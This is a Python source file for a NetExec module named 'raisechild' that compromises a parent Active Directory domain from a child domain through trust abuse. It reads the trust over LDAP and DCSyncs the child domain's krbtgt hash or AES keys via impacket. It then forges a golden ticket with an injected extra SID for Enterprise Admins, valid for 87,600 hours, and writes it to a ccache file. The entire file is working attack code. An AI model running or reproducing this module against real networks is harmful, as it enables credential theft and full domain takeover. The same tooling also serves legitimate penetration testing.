import os
import datetime
import re
from contextlib import suppress
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
from impacket.dcerpc.v5.drsuapi import DCERPCSessionError
from calendar import timegm
from binascii import unhexlify
from pyasn1.codec.der import encoder
from pyasn1.type.univ import noValue
from impacket.krb5.asn1 import AS_REP, EncTicketPart, EncASRepPart, AuthorizationData
from impacket.krb5.types import KerberosTime
from impacket.krb5.constants import ApplicationTagNumbers, ProtocolVersionNumber, PrincipalNameType, TicketFlags, AuthorizationDataType, EncryptionTypes, ChecksumTypes, KERB_NON_KERB_CKSUM_SALT, encodeFlags
from impacket.krb5.crypto import Key, _enctype_table, _checksum_table
from impacket.krb5.ccache import CCache
from impacket.krb5.pac import VALIDATION_INFO, KERB_VALIDATION_INFO, PAC_LOGON_INFO, PAC_CLIENT_INFO, PAC_CLIENT_INFO_TYPE, PAC_REQUESTOR, PAC_REQUESTOR_INFO, PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM, PAC_SIGNATURE_DATA, PAC_INFO_BUFFER, PACTYPE, PKERB_SID_AND_ATTRIBUTES_ARRAY, KERB_SID_AND_ATTRIBUTES
from impacket.dcerpc.v5.ndr import NDRULONG
from impacket.dcerpc.v5.samr import GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
from impacket.dcerpc.v5.dtypes import SID, RPC_SID, NULL
from nxc.parsers.ldap_results import parse_result_attributes
from nxc.helpers.misc import CATEGORY

# Encryption type configurations: enctype, checksum, signature size, session key size
ETYPE_CONFIG = {
    "rc4": (EncryptionTypes.rc4_hmac.value, ChecksumTypes.hmac_md5.value, 16, 16),
    "aes128": (EncryptionTypes.aes128_cts_hmac_sha1_96.value, ChecksumTypes.hmac_sha1_96_aes128.value, 12, 16),
    "aes256": (EncryptionTypes.aes256_cts_hmac_sha1_96.value, ChecksumTypes.hmac_sha1_96_aes256.value, 12, 32),
}


class NXCModule:
    """Module made by @azoxlpf"""
    name = "raisechild"
    description = "Compromise parent domain from child domain via trust abuse"
    supported_protocols = ["ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.parent_domain = None
        self.parent_sid = None
        self.child_sid = None
        self.child_domain = None
        self.target_dc = None
        self.valid_tgt = None
        self.new_ticket = None
        self.krbtgt_hash = ""
        self.aes128_key = ""
        self.aes256_key = ""
        self.etype = "rc4"

    def options(self, context, module_options):
        """
        Forge a Kerberos TGT using the child domain's krbtgt hash, with an extra SID targeting privileged groups in the parent domain.
        Requires an existing trust with the parent.

        USER        Target username to forge the ticket for (default: Administrator)
        USER_ID     RID used as the user ID in the PAC (default: 500)
        RID         RID used for the extra SID (default: 519 = Enterprise Admins)
        ETYPE       Encryption type for the ticket: rc4, aes128, aes256 (default: rc4)

        Examples:
        netexec ldap <ip> -u <username> -p <password> -M raisechild -o USER=DC01$
        netexec ldap <ip> -u <username> -p <password> -M raisechild -o USER_ID=1001
        netexec ldap <ip> -u <username> -p <password> -M raisechild -o RID=512
        netexec ldap <ip> -u <username> -p <password> -M raisechild -o ETYPE=aes256
        """
        self.context = context
        self.module_options = module_options
        self.etype = module_options.get("ETYPE", "rc4").lower()

    def on_admin_login(self, context, connection):
        self.context = context
        context.log.display("Running raisechild module...")
        self.get_domain_sid(connection)
        self.get_parent_info(connection)
        if not self.parent_domain or not self.parent_sid:
            context.log.fail("No parent trust (AD + inbound) found.")
            return
        self.get_krbtgt_hash(connection)

    def get_parent_info(self, connection):
        base_dn = f"CN=System,{connection.baseDN}"
        attributes = ["name", "trustPartner", "securityIdentifier", "trustDirection", "trustType"]

        try:
            response = connection.search(
                searchFilter="(objectClass=trustedDomain)",
                attributes=attributes,
                baseDN=base_dn,
            )
            trusts = parse_result_attributes(response)
            self.context.log.debug(f"TrustedDomain objects: {trusts}")

            for trust in trusts:
                trust_name = trust.get("name")
                trust_partner = trust.get("trustPartner")
                trust_sid = trust.get("securityIdentifier")
                trust_direction = int(trust.get("trustDirection", 0))
                trust_type = int(trust.get("trustType", 0))

                # 2 = TRUST_TYPE_UPLEVEL; direction 1 (inbound) or 3 (bi-directional)
                if trust_type == 2 and trust_direction in (1, 3):
                    self.parent_domain = trust_partner or trust_name

                    try:
                        revision = trust_sid[0]
                        count = trust_sid[1]
                        id_auth = int.from_bytes(trust_sid[2:8], byteorder="big")
                        sub_auths = [
                            str(int.from_bytes(trust_sid[8 + i * 4 : 12 + i * 4], byteorder="little"))
                            for i in range(count)
                        ]
                        trust_sid = f"S-{revision}-{id_auth}-" + "-".join(sub_auths)
                    except Exception as e:
                        self.context.log.fail(f"Failed to convert parent SID to string: {e}")
                        trust_sid = None

                    self.parent_sid = trust_sid
                    self.context.log.highlight(f"Parent domain name: {self.parent_domain}")
                    self.context.log.highlight(f"Parent domain SID:  {self.parent_sid}")
                    return

        except Exception as e:
            self.context.log.fail(f"Failed to query trustedDomain entries: {e}")

    def get_domain_sid(self, connection):
        if connection.sid_domain:
            self.child_sid = connection.sid_domain
            self.context.log.highlight(f"Child Domain SID: {self.child_sid}")
        else:
            self.context.log.fail("Could not retrieve child domain SID from connection.")

    def _get_smb_session(self, ldap_conn):
        smb = SMBConnection(
            remoteName=ldap_conn.hostname,
            remoteHost=ldap_conn.host,
            sess_port=445,
        )

        if ldap_conn.kerberos:
            smb.kerberosLogin(
                user=ldap_conn.username,
                password=ldap_conn.password,
                domain=ldap_conn.domain,
                lmhash=ldap_conn.lmhash,
                nthash=ldap_conn.nthash,
                aesKey=ldap_conn.aesKey,
                kdcHost=ldap_conn.kdcHost,
                useCache=ldap_conn.use_kcache,
            )
        elif ldap_conn.nthash or ldap_conn.lmhash:
            # NTLM pass-the-hash
            smb.login(ldap_conn.username, "", ldap_conn.domain, lmhash=ldap_conn.lmhash, nthash=ldap_conn.nthash)
        else:
            # NTLM with cleartext password
            smb.login(ldap_conn.username, ldap_conn.password, ldap_conn.domain)
        return smb

    def _get_domain_netbios(self, ldap_conn):
        resp = ldap_conn.search(
            baseDN=f"CN=Partitions,{ldap_conn.configuration_context}",
            searchFilter=f"(&(objectCategory=crossRef)(dnsRoot={ldap_conn.targetDomain})(nETBIOSName=*))",
            attributes=["nETBIOSName"],
        )
        entries = parse_result_attributes(resp)
        return entries[0]["nETBIOSName"]

    def _dcsync_krbtgt(self, smb_conn, ldap_conn):
        try:
            rop = RemoteOperations(
                smb_conn,
                doKerberos=ldap_conn.kerberos,
                kdcHost=ldap_conn.kdcHost,
            )
            rop.enableRegistry()
            boot_key = rop.getBootKey()

            domain_netbios = self._get_domain_netbios(ldap_conn)
            target_user = f"{domain_netbios}/krbtgt"

            def grab_hash(secret_type, secret):
                if secret_type == NTDSHashes.SECRET_TYPE.NTDS:
                    self.krbtgt_hash = secret
                elif secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
                    if "aes256-cts-hmac-sha1-96" in secret.lower():
                        self.aes256_key = secret.split(":")[-1]
                    elif "aes128-cts-hmac-sha1-96" in secret.lower():
                        self.aes128_key = secret.split(":")[-1]

            ntds = NTDSHashes(
                None,
                boot_key,
                isRemote=True,
                noLMHash=True,
                remoteOps=rop,
                justNTLM=self.etype == "rc4",
                justUser=target_user,
                printUserStatus=False,
                perSecretCallback=grab_hash,
            )
            ntds.dump()

            secret = {"rc4": self.krbtgt_hash, "aes128": self.aes128_key, "aes256": self.aes256_key}.get(self.etype)
            label = "hash" if self.etype == "rc4" else f"{self.etype.upper()} key"
            if secret:
                self.context.log.highlight(f"krbtgt {label}: {secret}")
            else:
                self.context.log.fail(f"DCSync completed - krbtgt {label} not found!")
        except DCERPCSessionError as e:
            self.context.log.fail(f"RPC DRSUAPI error: {e}")
        except Exception as e:
            self.context.log.fail(f"DCSync error: {e}")
        finally:
            with suppress(Exception):
                if ntds:
                    ntds.finish()
            with suppress(Exception):
                if rop:
                    rop.finish()
            with suppress(Exception):
                smb_conn.logoff()

    def get_krbtgt_hash(self, connection):
        try:
            smb_conn = self._get_smb_session(connection)
            self._dcsync_krbtgt(smb_conn, connection)
        except Exception as e:
            self.context.log.fail(f"Error during DCSync: {e}")
            return

        if (self.etype == "rc4" and self.krbtgt_hash) or (self.etype == "aes128" and self.aes128_key) or (self.etype == "aes256" and self.aes256_key):
            try:
                tgt = self.forge_golden_ticket(connection)
                self.context.log.success(f"Golden ticket forged successfully (etype: {self.etype}). Saved to: {tgt}")
                self.context.log.success(f"Run the following command to use the TGT: export KRB5CCNAME={tgt}")
                self.forged_tgt = tgt
            except Exception as e:
                self.context.log.fail(f"Error while generating golden ticket : {e}")
        else:
            self.context.log.fail(f"Cannot forge ticket: required hash/key for etype '{self.etype}' not found.")

    def forge_golden_ticket(self, connection):
        """
        Forge a golden ticket for the parent domain using the krbtgt key.
        Supports optional USER, RID, USER_ID and ETYPE module options.
        """
        admin_name = self.module_options.get("USER", "Administrator")
        extra_rid = str(self.module_options.get("RID", "519"))
        extra_sid = f"{self.parent_sid}-{extra_rid}"
        user_rid = str(self.module_options.get("USER_ID", "500"))

        domain_upper = connection.domain.upper()
        groups_list = [513, 512, 520, 518, 519]

        # Create ticket
        enctype_value, checksum_type, sig_size, key_size = ETYPE_CONFIG[self.etype]
        key_map = {"rc4": self.krbtgt_hash, "aes128": self.aes128_key, "aes256": self.aes256_key}
        raw_key = self._clean_nthash(key_map[self.etype]) if self.etype == "rc4" else key_map[self.etype]
        krbtgt_key = Key(_enctype_table[enctype_value].enctype, unhexlify(raw_key))

        validation_info = self._createBasicValidationInfo(admin_name, domain_upper, self.child_sid, groups_list, int(user_rid))
        pac_infos = self._createBasicPac(validation_info, admin_name, checksum_type, sig_size)
        self._createRequestorInfoPac(pac_infos, self.child_sid, int(user_rid))

        as_rep = self._buildAsrep(domain_upper, admin_name, enctype_value)
        enc_asrep_part, enc_ticket_part, pac_infos = self._buildEncParts(as_rep, domain_upper, admin_name, 87600, enctype_value, pac_infos, key_size)

        self._injectExtraSids(pac_infos, extra_sid)

        encoded_asrep, client_session_key = self._signEncryptTicket(as_rep, enc_asrep_part, enc_ticket_part, pac_infos, krbtgt_key, enctype_value)

        return self._saveTicket(admin_name, encoded_asrep, client_session_key)

    def _clean_nthash(self, raw):
        if ":" in raw:
            parts = raw.split(":")
            if len(parts) >= 4:
                raw = parts[3]
        raw = raw.strip()
        if not re.fullmatch(r"[0-9a-fA-F]{32}", raw):
            raise ValueError(f"Invalid NT-hash format : {raw}")
        return raw.lower()

    # Rest is stolen from impacket's ticketer.py
    @staticmethod
    def _getFileTime(unix_seconds: int) -> int:
        return unix_seconds * 10_000_000 + 116_444_736_000_000_000

    @staticmethod
    def _getPadLength(length: int) -> int:
        return ((length + 7) // 8 * 8) - length

    @staticmethod
    def _getBlockLength(length: int) -> int:
        return (length + 7) // 8 * 8

    def _createBasicValidationInfo(self, username: str, domain: str, domain_sid: str, groups: list[int], user_rid: int) -> VALIDATION_INFO:
        kerbdata = KERB_VALIDATION_INFO()

        now_utc = datetime.datetime.now(datetime.timezone.utc)
        now_unix = timegm(now_utc.timetuple())
        now_filetime = self._getFileTime(now_unix)

        kerbdata["LogonTime"]["dwLowDateTime"] = now_filetime & 0xFFFFFFFF
        kerbdata["LogonTime"]["dwHighDateTime"] = now_filetime >> 32
        kerbdata["LogoffTime"]["dwLowDateTime"] = 0xFFFFFFFF
        kerbdata["LogoffTime"]["dwHighDateTime"] = 0x7FFFFFFF
        kerbdata["KickOffTime"]["dwLowDateTime"] = 0xFFFFFFFF
        kerbdata["KickOffTime"]["dwHighDateTime"] = 0x7FFFFFFF

        kerbdata["PasswordLastSet"]["dwLowDateTime"] = now_filetime & 0xFFFFFFFF
        kerbdata["PasswordLastSet"]["dwHighDateTime"] = now_filetime >> 32
        kerbdata["PasswordCanChange"]["dwLowDateTime"] = 0
        kerbdata["PasswordCanChange"]["dwHighDateTime"] = 0
        kerbdata["PasswordMustChange"]["dwLowDateTime"] = 0xFFFFFFFF
        kerbdata["PasswordMustChange"]["dwHighDateTime"] = 0x7FFFFFFF

        kerbdata["EffectiveName"] = username
        kerbdata["FullName"] = ""
        kerbdata["LogonScript"] = ""
        kerbdata["ProfilePath"] = ""
        kerbdata["HomeDirectory"] = ""
        kerbdata["HomeDirectoryDrive"] = ""
        kerbdata["LogonCount"] = 500
        kerbdata["BadPasswordCount"] = 0
        kerbdata["UserId"] = int(user_rid)

        primary_group_id = int(groups[0]) if groups else 513
        kerbdata["PrimaryGroupId"] = primary_group_id
        kerbdata["GroupCount"] = len(groups)
        for group_rid in (groups or [513]):
            membership = GROUP_MEMBERSHIP()
            ndr_rid = NDRULONG()
            ndr_rid["Data"] = int(group_rid)
            membership["RelativeId"] = ndr_rid
            membership["Attributes"] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
            kerbdata["GroupIds"].append(membership)

        kerbdata["UserFlags"] = 0
        kerbdata["UserSessionKey"] = b"\x00" * 16
        kerbdata["LogonServer"] = ""
        kerbdata["LogonDomainName"] = domain
        kerbdata["LogonDomainId"].fromCanonical(domain_sid)
        kerbdata["LMKey"] = b"\x00" * 8
        kerbdata["UserAccountControl"] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
        kerbdata["SubAuthStatus"] = 0

        kerbdata["LastSuccessfulILogon"]["dwLowDateTime"] = 0
        kerbdata["LastSuccessfulILogon"]["dwHighDateTime"] = 0
        kerbdata["LastFailedILogon"]["dwLowDateTime"] = 0
        kerbdata["LastFailedILogon"]["dwHighDateTime"] = 0
        kerbdata["FailedILogonCount"] = 0
        kerbdata["Reserved3"] = 0

        kerbdata["ResourceGroupDomainSid"] = NULL
        kerbdata["ResourceGroupCount"] = 0
        kerbdata["ResourceGroupIds"] = NULL

        validation_info = VALIDATION_INFO()
        validation_info["Data"] = kerbdata
        return validation_info

    def _createBasicPac(self, validation_info: VALIDATION_INFO, username: str, checksum_type: int, sig_size: int) -> dict:
        pac_infos: dict[int, bytes] = {}
        pac_infos[PAC_LOGON_INFO] = validation_info.getData() + validation_info.getDataReferents()

        server_checksum_placeholder = PAC_SIGNATURE_DATA()
        private_checksum_placeholder = PAC_SIGNATURE_DATA()
        server_checksum_placeholder["SignatureType"] = checksum_type
        private_checksum_placeholder["SignatureType"] = checksum_type
        server_checksum_placeholder["Signature"] = b"\x00" * sig_size
        private_checksum_placeholder["Signature"] = b"\x00" * sig_size
        pac_infos[PAC_SERVER_CHECKSUM] = server_checksum_placeholder.getData()
        pac_infos[PAC_PRIVSVR_CHECKSUM] = private_checksum_placeholder.getData()

        client_info = PAC_CLIENT_INFO()
        client_name_utf16 = username.encode("utf-16le")
        client_info["Name"] = client_name_utf16
        client_info["NameLength"] = len(client_name_utf16)
        pac_infos[PAC_CLIENT_INFO_TYPE] = client_info.getData()

        return pac_infos

    def _createRequestorInfoPac(self, pac_infos: dict, domain_sid: str, user_rid: int) -> None:
        requestor = PAC_REQUESTOR()
        requestor["UserSid"] = SID()
        requestor["UserSid"].fromCanonical(f"{domain_sid}-{int(user_rid)}")
        pac_infos[PAC_REQUESTOR_INFO] = requestor.getData()

    def _buildAsrep(self, domain: str, username: str, enctype_value: int) -> AS_REP:
        as_rep = AS_REP()
        as_rep["msg-type"] = ApplicationTagNumbers.AS_REP.value
        as_rep["pvno"] = 5

        as_rep["crealm"] = domain
        as_rep["cname"] = noValue
        as_rep["cname"]["name-type"] = PrincipalNameType.NT_PRINCIPAL.value
        as_rep["cname"]["name-string"] = noValue
        as_rep["cname"]["name-string"][0] = username

        as_rep["ticket"] = noValue
        as_rep["ticket"]["tkt-vno"] = ProtocolVersionNumber.pvno.value
        as_rep["ticket"]["realm"] = domain
        as_rep["ticket"]["sname"] = noValue
        as_rep["ticket"]["sname"]["name-type"] = PrincipalNameType.NT_SRV_INST.value
        as_rep["ticket"]["sname"]["name-string"] = noValue
        as_rep["ticket"]["sname"]["name-string"][0] = "krbtgt"
        as_rep["ticket"]["sname"]["name-string"][1] = domain

        as_rep["ticket"]["enc-part"] = noValue
        as_rep["ticket"]["enc-part"]["kvno"] = 2
        as_rep["ticket"]["enc-part"]["etype"] = enctype_value

        as_rep["enc-part"] = noValue
        as_rep["enc-part"]["kvno"] = 2
        as_rep["enc-part"]["etype"] = enctype_value
        as_rep["enc-part"]["cipher"] = noValue
        return as_rep

    def _injectExtraSids(self, pac_infos: dict, extra_sid_csv: str | None) -> None:
        if not extra_sid_csv or PAC_LOGON_INFO not in pac_infos:
            return

        current_blob = pac_infos[PAC_LOGON_INFO]
        validation_info = VALIDATION_INFO()
        validation_info.fromString(current_blob)
        base_len = len(validation_info.getData())
        validation_info.fromStringReferents(current_blob, base_len)

        validation_info["Data"]["UserFlags"] |= 0x20  # LOGON_EXTRA_SIDS

        if validation_info["Data"]["SidCount"] == 0 or not validation_info["Data"]["ExtraSids"]:
            validation_info["Data"]["ExtraSids"] = PKERB_SID_AND_ATTRIBUTES_ARRAY()
            validation_info["Data"]["SidCount"] = 0

        for sid_txt in str(extra_sid_csv).split(","):
            sid_txt = sid_txt.strip()
            if not sid_txt:
                continue
            sid_and_attr = KERB_SID_AND_ATTRIBUTES()
            rpc_sid = RPC_SID()
            rpc_sid.fromCanonical(sid_txt)
            sid_and_attr["Sid"] = rpc_sid
            sid_and_attr["Attributes"] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
            validation_info["Data"]["ExtraSids"].append(sid_and_attr)
            validation_info["Data"]["SidCount"] += 1

        pac_infos[PAC_LOGON_INFO] = validation_info.getData() + validation_info.getDataReferents()

    def _buildEncParts(self, as_rep: AS_REP, domain: str, username: str, duration_hours: int, enctype_value: int, pac_infos: dict, key_size: int) -> tuple[EncASRepPart, EncTicketPart, dict]:
        now_utc = datetime.datetime.now(datetime.timezone.utc)
        end_utc = now_utc + datetime.timedelta(hours=duration_hours)

        enc_ticket_part = EncTicketPart()
        enc_ticket_part["flags"] = encodeFlags([
            TicketFlags.forwardable.value,
            TicketFlags.proxiable.value,
            TicketFlags.renewable.value,
            TicketFlags.pre_authent.value,
            TicketFlags.initial.value,
        ])

        enc_ticket_part["key"] = noValue
        enc_ticket_part["key"]["keytype"] = enctype_value
        enc_ticket_part["key"]["keyvalue"] = os.urandom(key_size)

        enc_ticket_part["crealm"] = domain
        enc_ticket_part["cname"] = noValue
        enc_ticket_part["cname"]["name-type"] = PrincipalNameType.NT_PRINCIPAL.value
        enc_ticket_part["cname"]["name-string"] = noValue
        enc_ticket_part["cname"]["name-string"][0] = username

        enc_ticket_part["transited"] = noValue
        enc_ticket_part["transited"]["tr-type"] = 0
        enc_ticket_part["transited"]["contents"] = ""

        enc_ticket_part["authtime"] = KerberosTime.to_asn1(now_utc)
        enc_ticket_part["starttime"] = KerberosTime.to_asn1(now_utc)
        enc_ticket_part["endtime"] = KerberosTime.to_asn1(end_utc)
        enc_ticket_part["renew-till"] = KerberosTime.to_asn1(end_utc)

        enc_ticket_part["authorization-data"] = noValue
        enc_ticket_part["authorization-data"][0] = noValue
        enc_ticket_part["authorization-data"][0]["ad-type"] = AuthorizationDataType.AD_IF_RELEVANT.value
        enc_ticket_part["authorization-data"][0]["ad-data"] = noValue

        if PAC_CLIENT_INFO_TYPE in pac_infos:
            client_id_filetime = self._getFileTime(timegm(now_utc.timetuple()))
            pac_client_info = PAC_CLIENT_INFO(pac_infos[PAC_CLIENT_INFO_TYPE])
            pac_client_info["ClientId"] = client_id_filetime
            pac_infos[PAC_CLIENT_INFO_TYPE] = pac_client_info.getData()

        enc_asrep_part = EncASRepPart()
        enc_asrep_part["key"] = noValue
        enc_asrep_part["key"]["keytype"] = enctype_value
        enc_asrep_part["key"]["keyvalue"] = enc_ticket_part["key"]["keyvalue"]
        enc_asrep_part["last-req"] = noValue
        enc_asrep_part["last-req"][0] = noValue
        enc_asrep_part["last-req"][0]["lr-type"] = 0
        enc_asrep_part["last-req"][0]["lr-value"] = KerberosTime.to_asn1(now_utc)
        enc_asrep_part["nonce"] = 123456789
        enc_asrep_part["key-expiration"] = KerberosTime.to_asn1(end_utc)
        enc_asrep_part["flags"] = list(enc_ticket_part["flags"])
        enc_asrep_part["authtime"] = str(enc_ticket_part["authtime"])
        enc_asrep_part["endtime"] = str(enc_ticket_part["endtime"])
        enc_asrep_part["starttime"] = str(enc_ticket_part["starttime"])
        enc_asrep_part["renew-till"] = str(enc_ticket_part["renew-till"])
        enc_asrep_part["srealm"] = domain
        enc_asrep_part["sname"] = noValue
        enc_asrep_part["sname"]["name-type"] = PrincipalNameType.NT_SRV_INST.value
        enc_asrep_part["sname"]["name-string"] = noValue
        enc_asrep_part["sname"]["name-string"][0] = "krbtgt"
        enc_asrep_part["sname"]["name-string"][1] = domain

        return enc_asrep_part, enc_ticket_part, pac_infos

    def _signEncryptTicket(self, as_rep: AS_REP, enc_asrep_part: EncASRepPart, enc_ticket_part: EncTicketPart, pac_infos: dict, krbtgt_key: Key, enctype_value: int) -> tuple[bytes, Key]:
        def zero_pad(n: int) -> bytes: return b"\x00" * self._getPadLength(n)

        pac_buffer_order = [PAC_LOGON_INFO, PAC_CLIENT_INFO_TYPE, PAC_REQUESTOR_INFO, PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM]

        pac_blobs_with_padding: list[tuple[int, bytes, bytes]] = []
        for buffer_type in pac_buffer_order:
            buffer_bytes = pac_infos[buffer_type]
            pac_blobs_with_padding.append((buffer_type, buffer_bytes, zero_pad(len(buffer_bytes))))

        buffer_count = len(pac_buffer_order)
        pac_info_buffer_header_size = len(PAC_INFO_BUFFER().getData())
        current_data_offset = 8 + pac_info_buffer_header_size * buffer_count

        def make_info_buffer(ul_type: int, blob_length: int) -> PAC_INFO_BUFFER:
            nonlocal current_data_offset
            info_buffer = PAC_INFO_BUFFER()
            info_buffer["ulType"] = ul_type
            info_buffer["cbBufferSize"] = blob_length
            info_buffer["Offset"] = current_data_offset
            current_data_offset = self._getBlockLength(current_data_offset + blob_length)
            return info_buffer

        info_buffers: list[PAC_INFO_BUFFER] = []
        for buffer_type, buffer_bytes, _ in pac_blobs_with_padding:
            info_buffers.append(make_info_buffer(buffer_type, len(buffer_bytes)))

        buffers_header_bytes = b"".join(info_buffer.getData() for info_buffer in info_buffers)
        buffers_data_bytes = b"".join(buffer_bytes + padding for _, buffer_bytes, padding in pac_blobs_with_padding)

        pac_type = PACTYPE()
        pac_type["cBuffers"] = buffer_count
        pac_type["Version"] = 0
        pac_type["Buffers"] = buffers_header_bytes + buffers_data_bytes
        pac_bytes_for_checksum = pac_type.getData()

        server_checksum_struct = PAC_SIGNATURE_DATA(pac_infos[PAC_SERVER_CHECKSUM])
        kdc_checksum_struct = PAC_SIGNATURE_DATA(pac_infos[PAC_PRIVSVR_CHECKSUM])

        checksum_function_server = _checksum_table[server_checksum_struct["SignatureType"]]
        checksum_function_kdc = _checksum_table[kdc_checksum_struct["SignatureType"]]

        server_checksum_struct["Signature"] = checksum_function_server.checksum(krbtgt_key, KERB_NON_KERB_CKSUM_SALT, pac_bytes_for_checksum)
        kdc_checksum_struct["Signature"] = checksum_function_kdc.checksum(krbtgt_key, KERB_NON_KERB_CKSUM_SALT, server_checksum_struct["Signature"])

        rebuilt_blobs: list[bytes] = []
        for buffer_type, buffer_bytes, padding in pac_blobs_with_padding:
            if buffer_type == PAC_SERVER_CHECKSUM:
                buffer_bytes = server_checksum_struct.getData()
            elif buffer_type == PAC_PRIVSVR_CHECKSUM:
                buffer_bytes = kdc_checksum_struct.getData()
            rebuilt_blobs.append(buffer_bytes + padding)
        pac_type["Buffers"] = buffers_header_bytes + b"".join(rebuilt_blobs)

        authorization_data = AuthorizationData()
        authorization_data[0] = noValue
        authorization_data[0]["ad-type"] = AuthorizationDataType.AD_WIN2K_PAC.value
        authorization_data[0]["ad-data"] = pac_type.getData()
        enc_ticket_part["authorization-data"][0]["ad-data"] = encoder.encode(authorization_data)

        ticket_cipher = _enctype_table[enctype_value]
        enc_ticket_part_bytes = encoder.encode(enc_ticket_part)
        encrypted_ticket_ciphertext = ticket_cipher.encrypt(krbtgt_key, 2, enc_ticket_part_bytes, None)
        as_rep["ticket"]["enc-part"]["cipher"] = encrypted_ticket_ciphertext
        as_rep["ticket"]["enc-part"]["kvno"] = 2

        enc_asrep_part_bytes = encoder.encode(enc_asrep_part)
        client_session_key = Key(ticket_cipher.enctype, enc_asrep_part["key"]["keyvalue"].asOctets())
        encrypted_encpart_ciphertext = ticket_cipher.encrypt(client_session_key, 3, enc_asrep_part_bytes, None)
        as_rep["enc-part"]["cipher"] = encrypted_encpart_ciphertext
        as_rep["enc-part"]["etype"] = ticket_cipher.enctype
        as_rep["enc-part"]["kvno"] = 1

        return encoder.encode(as_rep), client_session_key

    def _saveTicket(self, username: str, encoded_asrep: bytes, client_session_key: Key) -> str:
        ccache = CCache()
        ccache.fromTGT(encoded_asrep, client_session_key, client_session_key)
        out_path = f"{username}.ccache"
        ccache.saveFile(out_path)
        return out_path
